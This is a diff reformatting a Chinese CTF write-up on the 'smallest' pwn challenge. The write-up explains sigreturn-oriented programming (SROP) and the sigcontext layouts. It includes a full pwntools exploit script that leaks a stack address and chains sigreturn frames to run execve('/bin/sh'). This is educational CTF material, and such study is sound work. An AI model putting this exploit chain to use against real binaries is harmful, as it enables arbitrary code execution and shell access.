@@ -14,30 +14,33 @@ tags:
 很有意思的pwn题目，思路很新颖。
 代码如下：
 
-	.text:00000000004000B0                 xor     rax, rax
-	.text:00000000004000B3                 mov     edx, 400h       ; count
-	.text:00000000004000B8                 mov     rsi, rsp        ; buf
-	.text:00000000004000BB                 mov     rdi, rax        ; fd
-	.text:00000000004000BE                 syscall                 ; LINUX - sys_read
-	.text:00000000004000C0                 retn
-
+```nasm
+.text:00000000004000B0                 xor     rax, rax
+.text:00000000004000B3                 mov     edx, 400h       ; count
+.text:00000000004000B8                 mov     rsi, rsp        ; buf
+.text:00000000004000BB                 mov     rdi, rax        ; fd
+.text:00000000004000BE                 syscall                 ; LINUX - sys_read
+.text:00000000004000C0                 retn
+```
 短短6行。
 
 关于sigreturn的系统调用：
 
-    /*for x86*/
-    mov eax,0x77
-    int 80h
+```nasm
+/*for x86*/
+mov eax,0x77
+int 80h
 
-    /*for x86_64*/
-    mov rax,0xf
-    syscall
-
+/*for x86_64*/
+mov rax,0xf
+syscall
+```
 syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。
 可以理解为这样：
 
-	syscall(rax,rdi,rsi,rdx)
-
+```nasm
+syscall(rax,rdi,rsi,rdx)
+```
 对应的main函数功能就是：syscall(0,0,$rsp,0x400)，相当于调用了read函数read(0,$rsp,0x400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。
 
 
@@ -53,86 +56,88 @@ signal机制是类unix系统中进程之间相互传递信息的一种方法。�
 
 * x86
 
-		struct sigcontext
-		{
-		  unsigned short gs, __gsh;
-		  unsigned short fs, __fsh;
-		  unsigned short es, __esh;
-		  unsigned short ds, __dsh;
-		  unsigned long edi;
-		  unsigned long esi;
-		  unsigned long ebp;
-		  unsigned long esp;
-		  unsigned long ebx;
-		  unsigned long edx;
-		  unsigned long ecx;
-		  unsigned long eax;
-		  unsigned long trapno;
-		  unsigned long err;
-		  unsigned long eip;
-		  unsigned short cs, __csh;
-		  unsigned long eflags;
-		  unsigned long esp_at_signal;
-		  unsigned short ss, __ssh;
-		  struct _fpstate * fpstate;
-		  unsigned long oldmask;
-		  unsigned long cr2;
-		};
-
+```c
+struct sigcontext
+{
+  unsigned short gs, __gsh;
+  unsigned short fs, __fsh;
+  unsigned short es, __esh;
+  unsigned short ds, __dsh;
+  unsigned long edi;
+  unsigned long esi;
+  unsigned long ebp;
+  unsigned long esp;
+  unsigned long ebx;
+  unsigned long edx;
+  unsigned long ecx;
+  unsigned long eax;
+  unsigned long trapno;
+  unsigned long err;
+  unsigned long eip;
+  unsigned short cs, __csh;
+  unsigned long eflags;
+  unsigned long esp_at_signal;
+  unsigned short ss, __ssh;
+  struct _fpstate * fpstate;
+  unsigned long oldmask;
+  unsigned long cr2;
+};
+```
 * x64
 
-		struct _fpstate
-		{
-		  /* FPU environment matching the 64-bit FXSAVE layout.  */
-		  __uint16_t        cwd;
-		  __uint16_t        swd;
-		  __uint16_t        ftw;
-		  __uint16_t        fop;
-		  __uint64_t        rip;
-		  __uint64_t        rdp;
-		  __uint32_t        mxcsr;
-		  __uint32_t        mxcr_mask;
-		  struct _fpxreg    _st[8];
-		  struct _xmmreg    _xmm[16];
-		  __uint32_t        padding[24];
-		};
-		
-		struct sigcontext
-		{
-		  __uint64_t r8;
-		  __uint64_t r9;
-		  __uint64_t r10;
-		  __uint64_t r11;
-		  __uint64_t r12;
-		  __uint64_t r13;
-		  __uint64_t r14;
-		  __uint64_t r15;
-		  __uint64_t rdi;
-		  __uint64_t rsi;
-		  __uint64_t rbp;
-		  __uint64_t rbx;
-		  __uint64_t rdx;
-		  __uint64_t rax;
-		  __uint64_t rcx;
-		  __uint64_t rsp;
-		  __uint64_t rip;
-		  __uint64_t eflags;
-		  unsigned short cs;
-		  unsigned short gs;
-		  unsigned short fs;
-		  unsigned short __pad0;
-		  __uint64_t err;
-		  __uint64_t trapno;
-		  __uint64_t oldmask;
-		  __uint64_t cr2;
-		  __extension__ union
-		    {
-		      struct _fpstate * fpstate;
-		      __uint64_t __fpstate_word;
-		    };
-		  __uint64_t __reserved1 [8];
-		};
+```c
+struct _fpstate
+{
+  /* FPU environment matching the 64-bit FXSAVE layout.  */
+  __uint16_t        cwd;
+  __uint16_t        swd;
+  __uint16_t        ftw;
+  __uint16_t        fop;
+  __uint64_t        rip;
+  __uint64_t        rdp;
+  __uint32_t        mxcsr;
+  __uint32_t        mxcr_mask;
+  struct _fpxreg    _st[8];
+  struct _xmmreg    _xmm[16];
+  __uint32_t        padding[24];
+};
 
+struct sigcontext
+{
+  __uint64_t r8;
+  __uint64_t r9;
+  __uint64_t r10;
+  __uint64_t r11;
+  __uint64_t r12;
+  __uint64_t r13;
+  __uint64_t r14;
+  __uint64_t r15;
+  __uint64_t rdi;
+  __uint64_t rsi;
+  __uint64_t rbp;
+  __uint64_t rbx;
+  __uint64_t rdx;
+  __uint64_t rax;
+  __uint64_t rcx;
+  __uint64_t rsp;
+  __uint64_t rip;
+  __uint64_t eflags;
+  unsigned short cs;
+  unsigned short gs;
+  unsigned short fs;
+  unsigned short __pad0;
+  __uint64_t err;
+  __uint64_t trapno;
+  __uint64_t oldmask;
+  __uint64_t cr2;
+  __extension__ union
+    {
+      struct _fpstate * fpstate;
+      __uint64_t __fpstate_word;
+    };
+  __uint64_t __reserved1 [8];
+};
+```
 当内核将进程上下文sigcontext保存在该进程的栈上后，会在栈顶填上一个地址`rt_sigreturn`，这个地址指向一段代码，在这段代码中会调用`sigreturn`系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向`rt_sigreturn`，所以，signal handler函数的最后一条`ret`指令会使得执行流跳转到这段sigreturn代码，被动地进行`sigreturn`系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及`rt_sigreturn`：
 这里以64位为例子，给出Signal Frame更加详细的信息
 
@@ -155,69 +160,70 @@ signal机制是类unix系统中进程之间相互传递信息的一种方法。�
 
 ## 0x03 脚本
 
-	#!usr/bin/python
-	# -*- coding: utf-8 -*-
-	from pwn import *
-	import time
-	 
-	context.log_level = 'debug'
-	context.arch = "amd64"
-	exe = './smallest'
-	 
-	s = process(exe)
-	 
-	#调用write系统调用来泄露栈地址  
-	#write stack address  
-	main_addr = 0x4000b0
-	syscall_addr = 0x4000be
-	 
-	write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)
-	s.send(write_payload)
-	 
-	#返回地址改写为0x4000b3。 跳过 xor %rax,%rax 使rax保持为1
-	s.send("\xb3") # set rax=1  write     
-	stack_addr = u64(s.recv()[8:16])
-	print hex(stack_addr)
-	 
-	#得到一个栈地址后，让rsp指向stack_addr
-	#frame 
-	#call read into stack_addr
-	# target : get "/bin/sh" addr
-	frame = SigreturnFrame(kernel="amd64")
-	frame.rax = constants.SYS_read
-	frame.rdi = 0x0
-	frame.rsi = stack_addr
-	frame.rdx = 0x400
-	frame.rsp = stack_addr
-	frame.rip = syscall_addr
-	# frame代表read(0,stack_addr,0x400)  
-	 
-	#现将Payload写到栈上
-	read_frame_payload = p64(main_addr) + p64(0) + str(frame)
-	s.send(read_frame_payload)
-	 
-	#通过字符数量，调用sigreturn
-	goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8) # sigreturn syscall is 15 
-	s.send(goto_sigreturn_payload)
-	 
-	#frame 
-	#call execv("/bin/sh",0,0)
-	frame = SigreturnFrame(kernel="amd64")
-	frame.rax = constants.SYS_execve
-	frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr 
-	frame.rsi = 0x0
-	frame.rdx = 0x0
-	frame.rsp = stack_addr
-	frame.rip = syscall_addr
-	 
-	execv_frame_payload = p64(main_addr) + p64(0) + str(frame)
-	execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"
-	s.send(execv_frame_payload_all)
-	 
-	s.send(goto_sigreturn_payload)  
-	 
-	s.interactive()
-
+```python
+#!usr/bin/python
+# -*- coding: utf-8 -*-
+from pwn import *
+import time
+ 
+context.log_level = 'debug'
+context.arch = "amd64"
+exe = './smallest'
+ 
+s = process(exe)
+ 
+#调用write系统调用来泄露栈地址  
+#write stack address  
+main_addr = 0x4000b0
+syscall_addr = 0x4000be
+ 
+write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)
+s.send(write_payload)
+ 
+#返回地址改写为0x4000b3。 跳过 xor %rax,%rax 使rax保持为1
+s.send("\xb3") # set rax=1  write     
+stack_addr = u64(s.recv()[8:16])
+print hex(stack_addr)
+ 
+#得到一个栈地址后，让rsp指向stack_addr
+#frame 
+#call read into stack_addr
+# target : get "/bin/sh" addr
+frame = SigreturnFrame(kernel="amd64")
+frame.rax = constants.SYS_read
+frame.rdi = 0x0
+frame.rsi = stack_addr
+frame.rdx = 0x400
+frame.rsp = stack_addr
+frame.rip = syscall_addr
+# frame代表read(0,stack_addr,0x400)  
+ 
+#现将Payload写到栈上
+read_frame_payload = p64(main_addr) + p64(0) + str(frame)
+s.send(read_frame_payload)
+ 
+#通过字符数量，调用sigreturn
+goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8) # sigreturn syscall is 15 
+s.send(goto_sigreturn_payload)
+ 
+#frame 
+#call execv("/bin/sh",0,0)
+frame = SigreturnFrame(kernel="amd64")
+frame.rax = constants.SYS_execve
+frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr 
+frame.rsi = 0x0
+frame.rdx = 0x0
+frame.rsp = stack_addr
+frame.rip = syscall_addr
+ 
+execv_frame_payload = p64(main_addr) + p64(0) + str(frame)
+execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"
+s.send(execv_frame_payload_all)
+ 
+s.send(goto_sigreturn_payload)  
+ 
+s.interactive()
+```
 ## 0x04 总结
 
 1. srop结合rop进行使用，srop的作用除了控制执行流以外，更大的作用是可以控制所有寄存器，这是一般rop做不到的 
